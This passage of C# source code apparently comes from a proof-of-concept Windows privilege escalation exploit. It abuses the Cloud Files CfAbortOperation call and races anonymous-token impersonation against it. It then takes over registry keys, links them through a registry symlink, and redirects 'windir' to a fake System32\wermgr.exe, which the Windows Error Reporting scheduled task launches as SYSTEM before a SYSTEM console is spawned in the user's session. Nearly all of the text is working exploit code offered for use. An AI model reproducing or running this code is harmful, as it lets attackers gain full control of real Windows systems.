        private const string WER_TASK_PATH = @"\Microsoft\Windows\Windows Error Reporting\QueueReporting";

        // Logging infrastructure
        private static void Log(string message, string level = "INFO")
        {
            string logEntry = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " [" + level + "] " + message;
            Console.WriteLine(logEntry);
            
            // Write to log file
            try
            {
                string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "PoC_AbortHydration.log");
                using (StreamWriter writer = File.AppendText(logFilePath))
                {
                    writer.WriteLine(logEntry);
                }
            }
            catch (Exception)
            {
                // If logging fails, continue execution
            }
        }

        private static void LogError(string message, Exception ex = null)
        {
            string errorMessage = message;
            if (ex != null)
            {
                errorMessage += " | Exception: " + ex.GetType().Name + ": " + ex.Message;
            }
            Log(errorMessage, "ERROR");
        }

        private static void LogWarning(string message)
        {
            Log(message, "WARNING");
        }

        private static void LogInfo(string message)
        {
            Log(message, "INFO");
        }

        // Registry operations service
        private static NtKey OpenKey(NtKey root, string path, KeyAccessRights desired_access)
        {
            LogInfo("Opening for " + desired_access);
            using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
            {
                using (var key = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile, false))
                {
                    if (key.IsSuccess)
                        return key.Result.Duplicate();
                }

                using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                {
                    var result = NtKey.Open(obja, desired_access, KeyCreateOptions.NonVolatile);
                    if (result.IsSuccess)
                        return result.Result;
                }
            }
            return null;
        }

        private static void SetSecurityDescriptor(NtKey key, SecurityInformation info)
        {
            try
            {
                var sd = new SecurityDescriptor(SECURITY_DESCRIPTOR);
                key.SetSecurityDescriptor(sd, info);
                LogInfo("Set security descriptor on " + key.FullPath);
            }
            catch (Exception ex)
            {
                LogError("Failed to set security descriptor on " + key.FullPath, ex);
            }
        }

        private static void ForceKeyDeleteKey(NtKey root, string name)
        {
            LogInfo("Deleting " + root.FullPath + "\\" + name);
            try
            {
                // First, get WriteDac access to modify DACL
                using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
                {
                    if (key != null)
                    {
                        LogInfo("Opened " + name + " for WriteDac");
                        SetSecurityDescriptor(key, SecurityInformation.Dacl);
                    }
                }

                // Then, get WriteOwner access to modify owner
                using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
                {
                    if (key != null)
                    {
                        LogInfo("Opened " + name + " for WriteOwner");
                        SetSecurityDescriptor(key, SecurityInformation.Label);
                    }
                }

                // Finally, get Delete access and delete the key
                using (var new_key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
                {
                    if (new_key != null)
                    {
                        LogInfo("Opened " + name + " for enumerate and delete");
                        DeleteRegistryTree(new_key);
                        new_key.Delete();
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Failed to force delete key " + root.FullPath + "\\" + name, ex);
            }
        }

        private static void DeleteRegistryTree(NtKey root)
        {
            try
            {
                foreach (var name in root.QueryKeys())
                {
                    ForceKeyDeleteKey(root, name);
                }
            }
            catch (Exception ex)
            {
                LogError("Failed to delete registry tree under " + root.FullPath, ex);
            }
        }

        private static void CreateSymbolicLink(string source, string target)
        {
            try
            {
                NtKey.CreateSymbolicLink(source, null, target);
                LogInfo("Created symbolic link from " + source + " to " + target);
            }
            catch (Exception ex)
            {
                LogError("Failed to create symbolic link from " + source + " to " + target, ex);
            }
        }

        private static void SetValue(string keyPath, string valueName, object value)
        {
            try
            {
                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
                {
                    if (key != null)
                    {
                        key.SetValue(valueName, value);
                        LogInfo("Set value '" + valueName + "' to '" + value + "' in " + keyPath);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Failed to set value '" + valueName + "' in " + keyPath, ex);
            }
        }

        private static void DeleteKey(string keyPath, bool recursive = false)
        {
            try
            {
                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.Delete))
                {
                    if (key != null)
                    {
                        if (recursive)
                        {
                            DeleteRegistryTree(key);
                        }
                        key.Delete();
                        LogInfo("Deleted key " + keyPath);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Failed to delete key " + keyPath, ex);
            }
        }

        // State machine for exploit stages
        private static void ExecuteStage(int stage)
        {
            LogInfo("Executing stage " + stage);
            
            switch (stage)
            {
                case 0:
                    Stage0();
                    break;
                case 1:
                    Stage1(true);
                    break;
                case 2:
                    Stage2();
                    break;
                case 3:
                    Stage3();
                    break;
                default:
                    LogError("Unknown stage: " + stage);
                    break;
            }
        }

        private static void Stage0()
        {
            LogInfo("Stage 0: Starting");
            try
            {
                for (int i = 1; i < MAX_STAGE; ++i)
                {
                    Win32ProcessConfig config = new Win32ProcessConfig
                    {
                        CommandLine = "run",
                        ApplicationName = typeof(Program).Assembly.Location,
                        TerminateOnDispose = true
                    };

                    using (var p = Win32Process.CreateProcess(config))
                    {
                        if (p.Process.Wait(STAGE_WAIT_TIMEOUT) != NtStatus.STATUS_SUCCESS)
                        {
                            throw new ArgumentException("Failed to run stage");
                        }
                    }
                }
                LogInfo("Stage 0 completed");
            }
            catch (Exception ex)
            {
                LogError("Stage 0 failed", ex);
            }
        }

        private static void Stage1(bool root_key)
        {
            LogInfo("Stage 1: Starting");
            try
            {
                Thread check_key_th = new Thread(CheckKeyThread);
                check_key_th.IsBackground = true;
                check_key_th.Start(root_key);
                Thread.Sleep(1000);

                var th = NtThread.OpenCurrent();
                var anon_thread = new Thread(ForceTokenThread)
                {
                    IsBackground = true
                };
                anon_thread.Start(th);

                while (true)
                {
                    int result = CfAbortOperation(NtProcess.Current.ProcessId,
                        IntPtr.Zero, AbortHydrationFlags.Block);
                    if (result < 0)
                    {
                        LogError("CfAbortOperation failed with error: " + result);
                        break;
                    }
                }
                LogInfo("Stage 1 completed");
            }
            catch (Exception ex)
            {
                LogError("Stage 1 failed", ex);
            }
        }

        private static void Stage2()
        {
            LogInfo("Stage 2: Starting");
            try
            {
                using (var key = OpenKey(null, CLOUD_FILES, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
                {
                    if (key != null)
                    {
                        SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                        DeleteRegistryTree(key);
                    }
                }

                CreateSymbolicLink(BLOCKED_APPS, TARGET_KEY);
                Stage1(false);
                LogInfo("Stage 2 completed");
            }
            catch (Exception ex)
            {
                LogError("Stage 2 failed", ex);
            }
        }

        private static void Stage3()
        {
            LogInfo("Stage 3: Starting");
            try
            {
                // Clean up link
                using (var key = OpenKey(null, BLOCKED_APPS, KeyAccessRights.Delete))
                {
                    if (key != null)
                    {
                        LogInfo("Cleaning up link " + key.FullPath);
                        key.Delete();
                    }
                }

                // Set security on target key
                using (var key = OpenKey(null, TARGET_KEY, KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
                {
                    if (key != null)
                    {
                        SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                    }
                }

                // Clean up subkeys
                var key2 = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment", RegistryRights.FullControl);
                if (key2 != null)
                {
                    foreach (var subkey in key2.GetSubKeyNames())
                    {
                        var fullsubkey = TARGET_KEY + @"\" + subkey;
                        LogInfo("Cleaning up subkey " + fullsubkey);
                        
                        NtKey _subkey = null;
                        try
                        {
                            _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.WriteDac);
                        }
                        catch (Exception ex)
                        {
                            LogWarning("Failed to open " + fullsubkey + " with default access, trying with NtApi: " + ex.Message);
                            _subkey = OpenKey(null, fullsubkey, KeyAccessRights.WriteDac);
                        }
                        
                        if (_subkey != null)
                        {
                            SetSecurityDescriptor(_subkey, SecurityInformation.Dacl);
                            _subkey.Close();
                            
                            _subkey = NtKey.Open(fullsubkey, null, KeyAccessRights.Delete);
                            if (_subkey != null)
                            {
                                _subkey.Delete();
                                _subkey.Close();
                            }
                        }
                    }
                    key2.Close();
                }

                // Set windir environment variable
                SetValue(TARGET_KEY, "windir", Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName));

                // Create fake System32 directory and wermgr.exe
                string fakeSystem32 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\System32";
                Directory.CreateDirectory(fakeSystem32);
                string fakeWer = fakeSystem32 + @"\wermgr.exe";
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWer, true);

                // Set up named pipe server
                var srvnamedpipe = new NamedPipeServerStream(PIPE_NAME);
                var pipeWaitTask = srvnamedpipe.WaitForConnectionAsync();

                // Run Windows Error Reporting task
                using (TaskService tasksvc = new TaskService())
                {
                    Task wertask = tasksvc.GetTask(WER_TASK_PATH);
                    wertask.Run();
                    wertask.Dispose();
                }

                // Wait for pipe connection
                if (!pipeWaitTask.Wait(PIPE_CONNECTION_TIMEOUT))
                {
                    LogError("Exploit failed: Pipe connection timeout");
                }
                else
                {
                    LogInfo("Exploit succeeded");
                }

                // Clean up
                srvnamedpipe.Dispose();
                Thread.Sleep(1000);
                
                try
                {
                    File.Delete(fakeWer);
                    Directory.Delete(fakeSystem32);
                }
                catch (Exception ex)
                {
                    LogWarning("Failed to clean up fake files: " + ex.Message);
                }

                // Delete target key
                DeleteKey(TARGET_KEY, false);
                
                LogInfo("Stage 3 completed");
            }
            catch (Exception ex)
            {
                LogError("Stage 3 failed", ex);
            }
        }

        private static void CheckKeyThread(object root_key_obj)
        {
            bool root_key = (bool)root_key_obj;
            string path = root_key ? ROOT_KEY : @"\Registry\User\.DEFAULT";
            
            try
            {
                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                {
                    while (true)
                    {
                        if (key.NotifyChange(NotifyCompletionFilter.Name, true) == NtStatus.STATUS_NOTIFY_ENUM_DIR)
                        {
                            LogInfo("Change detected.");
                            Environment.Exit(0);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogError("Error in CheckKeyThread: " + ex.Message, ex);
            }
        }

        private static void ForceTokenThread(object obj)
        {
            try
            {
                using (var thread = (NtThread)obj)
                {
                    LogInfo("In force token thread " + thread);
                    using (var token = TokenUtils.GetAnonymousToken())
                    {
                        while (true)
                        {
                            thread.SetImpersonationToken(token);
                            thread.SetImpersonationToken(null);
                        }
                    }
                }
            }
            catch (ThreadAbortException)
            {
                return;
            }
            catch (Exception ex)
            {
                LogError("Error in ForceTokenThread: " + ex.Message, ex);
            }
        }

        [Flags]
        private enum AbortHydrationFlags
        {
            None = 0,
            Unblock = 1,
            Block = 2,
        }

        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        private static extern int CfAbortOperation(int pid, IntPtr unknown, AbortHydrationFlags flags);

        [StructLayout(LayoutKind.Sequential)]
        private struct CF_PLATFORM_INFO
        {
            public int BuildNumber;
            public int RevisionNumber;
            public int IntegrationNumber;
        }

        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
        private static extern int CfGetPlatformInfo(
          out CF_PLATFORM_INFO PlatformVersion
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);

        private static int Check(this int hr)
        {
            if (hr < 0)
                Marshal.ThrowExceptionForHR(hr);
            return hr;
        }

        static void Main(string[] args)
        {
            try
            {
                LogInfo("Starting exploit");
                
                // Check if running as system
                bool isSystem = false;
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    isSystem = identity.IsSystem;
                }

                if (isSystem)
                {
                    LogInfo("Running as SYSTEM");
                    Environment.SetEnvironmentVariable("windir", @"C:\Windows", EnvironmentVariableTarget.Process);
                    
                    var namedpipeclient = new NamedPipeClientStream(PIPE_NAME);
                    namedpipeclient.Connect();
                    
                    UInt32 nSesID;
                    IntPtr hPipe = namedpipeclient.SafePipeHandle.DangerousGetHandle();
                    
                    if (!GetNamedPipeServerSessionId(hPipe, out nSesID))
                    {
                        LogError("Failed to get named pipe server session ID");
                        return;
                    }
                    
                    namedpipeclient.Dispose();
                    
                    // Get and modify token
                    NtToken token = NtToken.OpenEffectiveToken();
                    NtToken token2 = token.DuplicateToken();
                    token.Dispose();
                    token = token2;
                    token.SetSessionId(((int)nSesID));
                    
                    // Create process as user
                    Win32Process.CreateProcessAsUser(token, @"C:\Windows\System32\conhost.exe", "", CreateProcessFlags.None, null);
                    return;
                }

                // Check platform info
                int platformResult = CfGetPlatformInfo(out CF_PLATFORM_INFO _);
                if (platformResult < 0)
                {
                    LogError("Failed to get platform info: " + platformResult);
                    return;
                }

                // Parse arguments and execute stage
                int stage = 0;
                if (args.Length > 0)
                {
                    if (!int.TryParse(args[0], out stage))
                    {
                        LogError("Invalid stage argument: " + args[0]);
                        return;
                    }
                    
                    if (stage < 0 || stage >= MAX_STAGE)
                    {
                        LogError("Stage must be between 0 and " + (MAX_STAGE - 1));
                        return;
                    }
                }

                // Execute the requested stage
                ExecuteStage(stage);
                
                LogInfo("Exploit completed");
            }
            catch (Exception ex)
            {
                LogError("Unhandled exception in Main", ex);
            }
        }
